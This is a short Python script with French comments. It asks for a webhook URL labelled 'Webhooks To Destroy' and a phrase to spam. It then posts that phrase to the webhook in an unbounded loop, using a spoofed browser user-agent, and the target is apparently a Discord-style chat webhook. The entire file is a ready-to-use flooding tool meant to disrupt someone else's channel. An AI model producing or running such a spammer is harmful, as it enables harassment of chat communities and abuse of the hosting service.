import json
from urllib import request
from urllib.error import HTTPError

# Les paramètres d'en-tête de la requête

headers = {
    'Content-Type': 'application/json',
    'user-agent': 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
}

# Enfin on construit notre requête

url_webhooks = (input("Webhooks To Destroy : "))

word_spam = (input("Phrase ou mot à spam :"))

payload = {'content': f"{word_spam}"}

r = request.Request(url = url_webhooks,
                      data=json.dumps(payload).encode('utf-8'),
                      headers=headers,
                      method='POST')


def send_webhook():
# Puis on l'émet !
    try:
        response = request.urlopen(r)
        print(response.status)
        print(response.reason)
        print(response.headers)
    except HTTPError as e:
        print('ERROR')
        print(e.reason)
        print(e.hdrs)
        print(e.file.read())
while True:
    send_webhook()